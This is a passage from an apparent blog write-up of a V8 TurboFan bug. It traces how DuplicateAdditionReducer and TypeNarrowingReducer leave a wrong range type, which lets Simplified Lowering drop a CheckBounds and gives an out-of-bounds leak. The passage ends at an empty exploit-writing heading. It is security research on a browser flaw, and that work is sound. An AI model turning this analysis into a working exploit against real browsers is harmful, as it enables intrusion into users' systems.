<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">1. lhs_min = 9007199254740989
2. lhs_max = 9007199254740992
3. rhs_min = 2
4. rhs_max = 2
</code></pre></div><p>Addition,</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">1. lhs_min + rhs_min = 9007199254740989 + 2 = 9007199254740991
2. lhs_min + rhs_max = 9007199254740989 + 2 = 9007199254740991
3. lhs_max + rhs_min = 9007199254740992 + 2 = 9007199254740994
4. lhs_max + rhs_max = 9007199254740992 + 2 = 9007199254740994
</code></pre></div><p>Min and Max Range,</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">array_min(results,4) = 9007199254740991
array_max(resutls,4) = 9007199254740994
</code></pre></div><p>Indeed the <code>AddRanger</code> function retured type range <code>Range(9007199254740991, 9007199254740994)</code>.</p>
<p><img src="/posts/static/DoubleAdditionReducer/010-range.png" alt="range"></p>
<p>But why the range in the turbofan showing <code>Range(9007199254740991, 9007199254740992)</code> instead of <code>Range(9007199254740991, 9007199254740994)</code>?</p>
<p>I&rsquo;m not sure but after few hours of debugging I found that the <code>NumberAdd</code> function is being called from the <code>TypeNarrowingReducer::Reduce</code> Function.</p>
<p><img src="/posts/static/DoubleAdditionReducer/012-typed-narrowing-reducer.png" alt="TypeNarrowing"></p>
<p>After the <code>NumberAdd</code> function returns, it&rsquo;ll reach at the code which is highlighted below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">TypeNarrowingReducer<span style="color:#f92672">::</span>TypeNarrowingReducer(Editor<span style="color:#f92672">*</span> editor, JSGraph<span style="color:#f92672">*</span> jsgraph,
                                           JSHeapBroker<span style="color:#f92672">*</span> broker)
    <span style="color:#f92672">:</span> AdvancedReducer(editor), jsgraph_(jsgraph), op_typer_(broker, zone()) {}

TypeNarrowingReducer<span style="color:#f92672">::~</span>TypeNarrowingReducer() <span style="color:#f92672">=</span> <span style="color:#66d9ef">default</span>;

Reduction TypeNarrowingReducer<span style="color:#f92672">::</span>Reduce(Node<span style="color:#f92672">*</span> node) {
  DisallowHeapAccess no_heap_access;

  Type new_type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Any();

  <span style="color:#66d9ef">switch</span> (node<span style="color:#f92672">-&gt;</span>opcode()) {
    <span style="color:#66d9ef">case</span> IrOpcode<span style="color:#f92672">::</span>kNumberLessThan: {
<span style="color:#75715e">/// [...]
</span><span style="color:#75715e"></span><span style="color:#75715e">#define DECLARE_CASE(Name)                                                \
</span><span style="color:#75715e">  case IrOpcode::k##Name: {                                               \
</span><span style="color:#75715e">    new_type = op_typer_.Name(NodeProperties::GetType(node-&gt;InputAt(0)),  \
</span><span style="color:#75715e">                              NodeProperties::GetType(node-&gt;InputAt(1))); \
</span><span style="color:#75715e">    break;                                                                \
</span><span style="color:#75715e">  }
</span><span style="color:#75715e"></span>      SIMPLIFIED_NUMBER_BINOP_LIST(DECLARE_CASE)       
      DECLARE_CASE(SameValue)
<span style="color:#75715e">#undef DECLARE_CASE
</span><span style="color:#75715e"></span>
<span style="color:#75715e">// [...]
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
      <span style="color:#66d9ef">return</span> NoChange();
  }

<span style="display:block;width:100%;background-color:#3c3d38">  Type original_type <span style="color:#f92672">=</span> NodeProperties<span style="color:#f92672">::</span>GetType(node);
</span>  Type <span style="color:#66d9ef">restricted</span> <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Intersect(new_type, original_type, zone());
  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>original_type.Is(<span style="color:#66d9ef">restricted</span>)) {
    NodeProperties<span style="color:#f92672">::</span>SetType(node, <span style="color:#66d9ef">restricted</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Changed</span>(node);
  }
  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">NoChange</span>();
}
</code></pre></div><p>The two variable <code>new_type</code> and <code>original_type</code> are important variables. <code>new_types</code> is the returned <code>type</code> value from the <code>NumberAdd</code> function i.e, <code>Range(9007199254740991, 9007199254740994)</code>. And the <code>original_type</code> is the original type before the optimization <code>Range(9007199254740991, 9007199254740992)</code> because <code>9007199254740992 + 1 + 1</code> was <code>9007199254740992</code> before optimization.</p>
<p>before optimization:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&gt;</span>   <span style="color:#ae81ff">9007199254740992</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
<span style="color:#ae81ff">9007199254740992</span>
</code></pre></div><p>after optimization:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&gt;</span>   <span style="color:#ae81ff">9007199254740992</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>
<span style="color:#ae81ff">9007199254740994</span>
</code></pre></div><p>But the interesting part is this code</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">Type <span style="color:#66d9ef">restricted</span> <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Intersect(new_type, original_type, zone());
</code></pre></div><p>Inside the <code>intersect</code> function, in our case, in semi-fast case checks the function returned type2.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">Type Type<span style="color:#f92672">::</span>Intersect(Type type1, Type type2, Zone<span style="color:#f92672">*</span> zone) {
  <span style="color:#75715e">// Fast case: bit sets.
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (type1.IsBitset() <span style="color:#f92672">&amp;&amp;</span> type2.IsBitset()) {
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">NewBitset</span>(type1.AsBitset() <span style="color:#f92672">&amp;</span> type2.AsBitset());
  }

  <span style="color:#75715e">// Fast case: top or bottom types.
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (type1.IsNone() <span style="color:#f92672">||</span> type2.IsAny()) <span style="color:#66d9ef">return</span> type1;  <span style="color:#75715e">// Shortcut.
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (type2.IsNone() <span style="color:#f92672">||</span> type1.IsAny()) <span style="color:#66d9ef">return</span> type2;  <span style="color:#75715e">// Shortcut.
</span><span style="color:#75715e"></span>
  <span style="color:#75715e">// Semi-fast case.
</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (type1.Is(type2)) <span style="color:#66d9ef">return</span> type1; <span style="color:#75715e">// false
</span></span><span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (type2.Is(type1)) <span style="color:#66d9ef">return</span> type2; <span style="color:#75715e">// true; returned type2.
</span></span><span style="color:#75715e"></span>
  <span style="color:#75715e">// [...]
</span><span style="color:#75715e"></span>}
</code></pre></div><p>I was quite confused why the <code>type1</code> is not <code>type2</code> and why the <code>type2</code> is <code>type1</code>. Then i put the breakpoint on <code>Type::SlowIs</code> function.
Here, <code>type1</code> is <code>new_type</code> and <code>type2</code> is <code>original_type</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">bool</span> Type<span style="color:#f92672">::</span>SlowIs(Type that) <span style="color:#66d9ef">const</span> {

  <span style="color:#75715e">// [...]
</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#75715e"></span>
</span><span style="display:block;width:100%;background-color:#3c3d38">  <span style="color:#66d9ef">if</span> (that.IsRange()) {
</span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>IsRange() <span style="color:#f92672">&amp;&amp;</span> Contains(that.AsRange(), <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>AsRange());
  }

  <span style="color:#75715e">// [...]
</span><span style="color:#75715e"></span>}
</code></pre></div><p>In <code>SlowIs</code> function, <code>that</code> is the type that we passed inside <code>Is</code> function.</p>
<ol>
<li>when <code>that</code> is <code>type2</code> i.e., <code>type1.Is(type2)</code>, the <code>Contains</code> function returns false</li>
<li>when <code>that</code> is <code>type1</code> i.e., <code>type2.Is(type1)</code>, it <code>Contains</code> returns true.</li>
</ol>
<p>Function <code>Type::Contains</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#66d9ef">bool</span> Type<span style="color:#f92672">::</span>Contains(<span style="color:#66d9ef">const</span> RangeType<span style="color:#f92672">*</span> lhs, <span style="color:#66d9ef">const</span> RangeType<span style="color:#f92672">*</span> rhs) {
  DisallowHeapAllocation no_allocation;
  <span style="color:#66d9ef">return</span> lhs<span style="color:#f92672">-&gt;</span>Min() <span style="color:#f92672">&lt;=</span> rhs<span style="color:#f92672">-&gt;</span>Min() <span style="color:#f92672">&amp;&amp;</span> rhs<span style="color:#f92672">-&gt;</span>Max() <span style="color:#f92672">&lt;=</span> lhs<span style="color:#f92672">-&gt;</span>Max();
}
</code></pre></div><p>When the value <code>this</code> and <code>that</code> is passed inside the <code>Contains</code> function.</p>
<ol>
<li><code>that</code> = <code>lhs</code></li>
<li><code>this</code> = <code>rhs</code></li>
</ol>
<h5 id="case-type1istype2">Case: type1.Is(type2)</h5>
<p>In this case <code>this</code> is the <code>type1</code> and <code>that</code> is the <code>type2</code>. Also,</p>
<ol>
<li><code>that</code> = <code>lhs</code> = <code>type2</code> = <code>original_type</code></li>
<li><code>this</code> = <code>rhs</code> = <code>type1</code> = <code>new_type</code></li>
</ol>
<p><img src="/posts/static/DoubleAdditionReducer/013-contains-type2.png" alt="istype2"></p>
<p>In our case, as of the <code>Contains</code> function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">1. minimum of type2 must be less than or equal to minimum of type1. // true
2. maximum of type1 must be less than or equal to maximum of type2. // false
</code></pre></div><p>So one of the condition didn&rsquo;t meet which is why <code>type1.Is(type2)</code> is false in this case.</p>
<h5 id="case-type2istype1">Case: type2.Is(type1)</h5>
<p>In this case <code>this</code> is the <code>type2</code> and <code>that</code> is the <code>type1</code>. Also,</p>
<ol>
<li><code>that</code> = <code>lhs</code> = <code>type1</code> = <code>new_type</code></li>
<li><code>this</code> = <code>rhs</code> = <code>type2</code> = <code>original_type</code></li>
</ol>
<p><img src="/posts/static/DoubleAdditionReducer/014-contains-type1.png" alt="istype2"></p>
<p>In our case, as of the <code>Contains</code> function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">1. minimum of type1 must be less than or equal to minimum of type2. // true
2. maximum of type2 must be less than or equal to maximum of type1. // true
</code></pre></div><p>So both condition met which is why <code>type2.Is(type1)</code> is true in this case.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">TypeNarrowingReducer<span style="color:#f92672">::</span>TypeNarrowingReducer(Editor<span style="color:#f92672">*</span> editor, JSGraph<span style="color:#f92672">*</span> jsgraph,
                                           JSHeapBroker<span style="color:#f92672">*</span> broker)
    <span style="color:#f92672">:</span> AdvancedReducer(editor), jsgraph_(jsgraph), op_typer_(broker, zone()) {}

  <span style="color:#75715e">// [...]
</span><span style="color:#75715e"></span>
  Type original_type <span style="color:#f92672">=</span> NodeProperties<span style="color:#f92672">::</span>GetType(node);
<span style="display:block;width:100%;background-color:#3c3d38">  Type <span style="color:#66d9ef">restricted</span> <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Intersect(new_type, original_type, zone());
</span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>original_type.Is(<span style="color:#66d9ef">restricted</span>)) {
<span style="display:block;width:100%;background-color:#3c3d38">    NodeProperties<span style="color:#f92672">::</span>SetType(node, <span style="color:#66d9ef">restricted</span>);
</span><span style="display:block;width:100%;background-color:#3c3d38">    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Changed</span>(node);
</span>  }
  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">NoChange</span>();
}
</code></pre></div><p>So the <code>Type::Intersect</code> retured the <code>type2</code> which is <code>original_type</code> and set it to the <code>restricted</code> variable, i.e, <code>Range(9007199254740991, 9007199254740992)</code>. If the <code>restricted</code> type was not the <code>original_type</code>, <code>restricted</code> type would have been the <code>new_type</code> and the <code>type</code> would have been updated. But in this case the node (<code>NumberAdd</code>) type doesn&rsquo;t changed i.e., <code>Range(9007199254740991, 9007199254740992)</code>.
In conclusion, if the maximum of <code>new_type</code> was less than the maximum of <code>original_type</code> the <code>type</code> of node <code>NumberAdd</code> would have been changed. Because of the <code>DuplicateAdditionReducer</code> the maxium of <code>new_type</code> was greater than the maximum of <code>original_type</code>. So the <code>type</code> didn&rsquo;t changed.</p>
<h4 id="escape-analysis">Escape Analysis</h4>
<p>Here in escape analysis phase, after the LoadElimination the <code>LoadField</code> is replaced by <code>NumberConstant</code> with <code>Range(5,5)</code> which is the length of an array.</p>
<p><img src="/posts/static/DoubleAdditionReducer/007-escape-analysis.png" alt="002-escape-analysis"></p>
<h4 id="simplified-lowering">Simplified Lowering</h4>
<p>Now we can see that the <code>CheckBounds</code> is eliminate in the <code>Simplified Lowering</code> phase.</p>
<p><img src="/posts/static/DoubleAdditionReducer/005-simplified-lowering.png" alt="003-simplified-lowering"></p>
<p>This is the code that is responsible for elemination of <code>CheckBounds</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">  <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">VisitCheckBounds</span>(Node<span style="color:#f92672">*</span> node, SimplifiedLowering<span style="color:#f92672">*</span> lowering) {
    CheckParameters <span style="color:#66d9ef">const</span><span style="color:#f92672">&amp;</span> p <span style="color:#f92672">=</span> CheckParametersOf(node<span style="color:#f92672">-&gt;</span>op());
    Type <span style="color:#66d9ef">const</span> index_type <span style="color:#f92672">=</span> TypeOf(node<span style="color:#f92672">-&gt;</span>InputAt(<span style="color:#ae81ff">0</span>)); 
    Type <span style="color:#66d9ef">const</span> length_type <span style="color:#f92672">=</span> TypeOf(node<span style="color:#f92672">-&gt;</span>InputAt(<span style="color:#ae81ff">1</span>));
    <span style="color:#66d9ef">if</span> (length_type.Is(Type<span style="color:#f92672">::</span>Unsigned31())) {
      <span style="color:#66d9ef">if</span> (index_type.Is(Type<span style="color:#f92672">::</span>Integral32OrMinusZero())) {
        <span style="color:#75715e">// Map -0 to 0, and the values in the [-2^31,-1] range to the
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// [2^31,2^32-1] range, which will be considered out-of-bounds
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// as well, because the {length_type} is limited to Unsigned31.
</span><span style="color:#75715e"></span>        VisitBinop(node, UseInfo<span style="color:#f92672">::</span>TruncatingWord32(),
                   MachineRepresentation<span style="color:#f92672">::</span>kWord32);
        <span style="color:#66d9ef">if</span> (lower()) {
<span style="display:block;width:100%;background-color:#3c3d38">            <span style="color:#75715e">// index_type.Min() = 2;    2 &gt; 0.0 = ture
</span></span><span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#75715e"></span>            <span style="color:#75715e">// index_type.Max() = 3;    3 &lt; length_type.Min() = true
</span></span><span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#75715e"></span>            <span style="color:#75715e">// length_type.Min() = 5;   
</span></span><span style="color:#75715e"></span>          <span style="color:#66d9ef">if</span> (lowering<span style="color:#f92672">-&gt;</span>poisoning_level_ <span style="color:#f92672">==</span>
                  PoisoningMitigationLevel<span style="color:#f92672">::</span>kDontPoison <span style="color:#f92672">&amp;&amp;</span>
              (index_type.IsNone() <span style="color:#f92672">||</span> length_type.IsNone() <span style="color:#f92672">||</span>
               (index_type.Min() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0.0</span> <span style="color:#f92672">&amp;&amp;</span>                      
                index_type.Max() <span style="color:#f92672">&lt;</span> length_type.Min()))) {
            <span style="color:#75715e">// The bounds check is redundant if we already know that
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// the index is within the bounds of [0.0, length[.
</span><span style="color:#75715e"></span>        
            <span style="color:#75715e">// This will remove the checkbound
</span><span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#75715e"></span>            DeferReplacement(node, node<span style="color:#f92672">-&gt;</span>InputAt(<span style="color:#ae81ff">0</span>));
</span>          } <span style="color:#66d9ef">else</span> {
            NodeProperties<span style="color:#f92672">::</span>ChangeOp(
                node, simplified()<span style="color:#f92672">-&gt;</span>CheckedUint32Bounds(p.feedback()));
          }
        }
      }
      <span style="color:#75715e">// [...]
</span><span style="color:#75715e"></span>  }
</code></pre></div><p>Inside gdb:</p>
<p><img src="/posts/static/DoubleAdditionReducer/008-type.png" alt="004-type">
<img src="/posts/static/DoubleAdditionReducer/009-escape-debug.png" alt="004-dbg"></p>
<p>As we can see below we have a leak.
<img src="/posts/static/DoubleAdditionReducer/006-oob.png" alt="006-output"></p>
<h2 id="writing-exploit">Writing Exploit</h2>
<h3 id="exploit-primitive">Exploit Primitive</h3>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
